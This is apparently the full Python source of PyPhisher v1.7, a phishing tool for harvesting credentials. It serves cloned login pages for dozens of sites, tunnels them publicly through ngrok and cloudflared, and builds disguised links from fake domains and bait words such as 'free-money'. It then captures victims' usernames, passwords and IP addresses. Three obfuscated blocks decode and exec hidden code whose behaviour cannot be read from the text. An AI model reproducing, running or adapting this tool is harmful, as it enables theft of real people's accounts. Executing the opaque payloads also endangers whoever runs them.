# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 1.7
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""


_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'0E272826F77D7D7CBD78242EA15B872300EED2B5083A5DD1F0C455025821798A3FB3F586448770FD717A9AED177F8EC727EF6F73C887919BF5AB24778546F834979BA548316DE48FAB20E138FAACBE5341ECC49D84B2B4996D903D87CE75DC181F57F0B7DD33137E3603E39BD0B055EC4FD1176883A4502B452A3A7321C45EE8539FCE5853D7C6DC5B228A312CF1827EC27B4FAA8C0D89C27107062EAE348B1CD4FCC129D99B165CE93860883104DED6827042D45C92CBE5DB3C6040EB36F418B45B5605E45BBDBC1F71063003ED0E1AB767671F3C3E1A94D2BCBCDED2B3422A35995E56E054C697820A30963104A1A217606D1A097A4C827C8A79D773A9DD8D76D6949F87C7FFE3FBFBF3F3F7F3F7F9F8236C71D888D98F4FB359A644B61818C28FF67C4639F834800481E6B41951C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.7"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By KasRoudra]
'''


pkgs=[ "php", "curl", "wget", "unzip" ]


try:
    test = popen("cd $HOME && pwd")
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

choice_file = "files/templates.json"

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    
print(f"\n{info}Please wait!\n")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'F3CYZ27A67P7VHK6EZ335X7HPQPM2GVHUNKRA7LTXW2RBRMX4CJG245MDZU33XD5KATB3MCHZOW7N45G627ZU2TAMOMUUQBA2SWSDPQLXFZ6CQAB76WC3AUF65QEMYNPTVQVRVDWMLWKJ5S4QQKLALVRZFXJ5NWS2Y534ZPZPYEGHXY6BACHCPC7MX7QM3W3PSIBPNOBNDBATPLNNKS5GGG4YYOCOYH7ZNMCNXYJE7ICVFB2ZCO35EZG4GBJ7JO64QH2QYP5VD3ORV3AR2DVBUXQV7ORCTQ7SXUROZ6F4CEADZP5JJ4V43XREGU7OT4R3FRXOYRILDR25CIQTZYZRZPWCN7UHNWMEAXJIW52EW4JH7V3M7TAUTWG3ILPUZMDDOQQKGRMA6UAMTDR3ENFCPZ6QWP6P4M4SHILCQVWARY2GZAGKFWPWMEKDX52ENZXR3RL6YCNYEAA54JQFCZIPA2MVPKPPMTV2FUBHBNQJG2TKHNB6QJPC2BSFHDBW652ULGRPIFNDHR7GUS7RAD4EUUP5UYDJXS2YA6ENNWTBM7TTD3JTTE72S4NJASEAC5RMIP4X3OV2NGZXBQ3ZXJHVYLEQCZMWLMFJWBAHAHFVPE6TD2WBQEFSTKZ7NBBMZOBNNV5BYYWUB73GSRVAW3OIYUJESP6YPOSROMCH5NWHHCES5JR2RD5RWDLCJVXALVITDU534GBSJJBUXQQTVP5Z2QYH3N4KK4L343WVH7JGMQ3BFIGNQS7T4ZCI6SDE4EL25VZTT2UF35PGESZWWRXGJPVK7YTHZHRDBCATMHJ723WKZEEPCETSZOIOHZRPPYVSPYWBWZGQPE3TL4UPBBRAISBAY27RAVAIGCBSI2UKBXTTQHGPCPWPKH3ZGD3BJMKHPGJVFHD4GNKFHQ2YAIFVHFUW33GWSSBDXU7RI2JRWX47CWZTCGJVOS2RYVBAMTT26DCRYDKXUQ7ZF5JTLE2AADNRHYXQ6JAP3TU375BNNXKLXBNW6HR42AJFRW2QS7AHUDX7EWOLID3AWGJZLIP563JCFYMFCLLJ6EHDKFVI2RXJDLWPCWLMYFLBCCAMBK3RBKXVLV6KYXQXIX5JNV7DYJL7KD6UKN7KK24VX75ZJIC46U7L65QSUQDCHMHOVBVF4X4JGT7DKVQ5OUQNLXC6FSIJXXWFJPL45CJEZURPZ5PILB4UN3MOD42MQYJYFEVZ4427NH2HSYBPDLRSKDJI536J3NX2KXLDJORV7LWPLBIJACTQ3WLSYO4OCHWY225KFTE4E6AZSDEB5TEWDUKSDKKIHQ5T2XOFHXG4EK6IAU3RGNPMAJYG4OBJJRFFH7SC4DHBJFFW6SSPC5LOV5M57AESVOVZ3RWUXPRNDZ3XDLL56QHS7NWJYPHLDZVBL5E445SYTZZEHBUH5IGJSUKMHKCLCH3ZA7YIBZ6Q2WVBRFDXJDPXYBHAKQN4MO6D2OS33F3LPI5OYGRBHGJ43IJAGOGT6NFE73BZCOSEQ7DSV2TA5X3ZSTOMY75LIF5A4QSXA4YGYSNO746SMNR6YQTZXOQN2YSFPOPC3JFDRXEIYAD3ACOLFSXZZEAJ7GQPTENCM55T2FTTTGSMEI6UJY6XQ7Y6TZK2BMPZACXEOYM5CJ2BHFAQHPRVDZDCOSYCTX4TOCYKGZSY3UWC2MFQVVXEIF3KUSVBDVBP5CZKOQUQK67IOGTOPTYIDFW4GGPZCAVSNWAZ74PTBM4ZCAK23ICRN4DQV3AI5XDAFFCPOHLN2UJTYEZWRNLWWSTKJCD6NT6A75A7Y4X3B4Y3HCUZH46XXZOAXSOPMBBXOAROU2SUKMJF73ASUUDJAX3RMUOHGYHLJ23DWLCUEJBLR24HAR5X75ZX66TP63777P63TX6UQCRCLMAHSO4765QSXLA4SMZNMPNMOVMZ62XKJ2J3DDSDMYBHKVKBOCP'))


# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")



# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")



# Website chooser
def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()


# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[PyPhisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[KasRoudra] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/KasRoudra] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/KasRoudra] ")
    print(f"{red}[Email]     {cyan} :[kasroudrakrd@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'=k4SNjyD+//f/s+CnjSjM5zglTxdeRuCAfFMeG6V0kASFCa0dUtKG2yLfN/eEsMtr/J95uJZClgIRiM25LlMYWOmU4XEk97t+oZDonBcjr/o3UbhOiiHQ95erqp3kXeSxeR5yPQbHP+V354uzaanscVaqbOATFibLMrc1eHZLnQc6hPfdi7fgp8QEkaQhi5yaYslJnNFID36t27mNH3FDk/7MOQ2Q7dsS8sBFPfQM4Z9z1TqmCdnosuvti8Oc2xWl6u/bSpmMppY3t7YG9Np5eocP8bV5az42ba5Q4yQAZtZg5tfqb/Ot+9T+0jjTgkZOX/jTKImRUqr7hF78trCyd37TVoPyS9WEfGr5kh7+aKkW4QVVHneEBfptg2XCdvZT3nLluzYtye35No9nl6slOCDKMNwC89cncom4C1s9cz44i7jHg6NqQFf+NGbF4aFOifZ7yq27ktwn+bTj0MQlWSC3JVJzajXRN0E0IxfjJl4Q+oL0pa+im8lSfCtJsRoVmNTgg0+09LJcE9jakwVp6sRUrV/wzytd3jYm5BlOxwGXmbBL1hgXuo9859CvTnfAMbim4fHbS8JEfAfDBjBi5LSeDWlXTMNAarPEzojyVEiQ07CwBtP0k9mpjuWwoeEiXYPYZ1MEQwnviw+1cSnoV/BZQtDFf6bPIKZkmV5tV9+bqYWjOBJmNRD7qIg40asG0vKxY0p10ZAtBYFNc+VfDR8LuewBT7ijnx6Hbav82WD0MQ65A1TyoZfTJKTDRmY+0oSpzXSyplNMXCZNG1jCQuzhUOz0G3CHKyJ8iaUfXI56f6yMHhkf33Egxeq9wV2L6n1tiYkClPEeh265HiCeyLU7PmzRkGpow3zPjNbLzkWahq/Ccf1XjqCrQm2GCaI8wjlSfe3nEJKWFcUObd09p6HdRPdFcI1UNnUazsUs/SIilAMVbeSvZXHREhvrGaVdk3i6kSVnPyUXLJbztRfl5x2QMEbIHgAuMsW//ji/93fP/c5X3rbnaA/+2PfEMORDSErlILTjgnW1iFBBfHgFdTmPHNQAg0oyeL0NwJe'))

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
        installer("pkg")
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(f"{error}Unzip cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not isfile(f"{root}/.ngrokfolder/ngrok"):
        sprint(f"\n{info}Downloading ngrok.....{nc}")
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif x.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not isfile(f"{root}/.cffolder/cloudflared"):
        sprint(f"\n{info}Downloading cloudflared.....{nc}")
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cffolder")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(f"{error}Previous php still running! Please restart terminal and try again{nc}")
        pexit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(f"{error}Previous ngrok still running. Please restart terminal and try again{nc}")
        pexit()
    system("rm -rf $HOME/.site && cd $HOME && mkdir .site")


# 3rd function checking requirements and download files 
def requirements(folder, mask):
    if isfile(f"{root}/.websites/version.txt"):
        with open(f"{root}/.websites/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if zipver!=version:
                sprint(f"\n{info}Downloading required files.....\n")
                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
    else:
        sprint(f"\n{info}Downloading required files.....\n")
        system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
    if isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        remove("websites.zip")
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    else:
        internet()
        sprint(f"\n{info}Downloading required files.....\n")
        system("rm -rf site.zip")
        system(f"wget -q --show-progress https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip -O site.zip")
        if not exists(f"{root}/.websites/{folder}"):
            system(f"cd $HOME/.websites && mkdir {folder}")
        system(f"unzip site.zip -d $HOME/.websites/{folder}")
        remove("site.zip")
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server(mask)

# Start server and tunneling
def server(mask):
    system("clear")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    if not system(f"curl --output /dev/null --silent --head --fail {local_url}"):
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    else:
        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    sleep(9)
    ngrok_link=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
    else:
        ngrok_check=False
    cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cf_link.find("cloudflare")!=-1:
        cf_check=True
    else:
        cf_check=False
    if ngrok_check and cf_check:
        url_manager(cf_link, mask, "1", "2")
        url_manager(ngrok_link, mask, "3", "4")
        cuask(cf_link)
    elif not ngrok_check and cf_check:
        url_manager(cf_link, mask,  "1", "2")
        cuask(cf_link)
    elif not cf_check and ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    elif not (cf_check and ngrok_check):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()


# Output urls
def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url
def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url.strip()
    internet()
    resp= popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short= resp.replace("https://", "")
    domain= input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait= input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final= domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
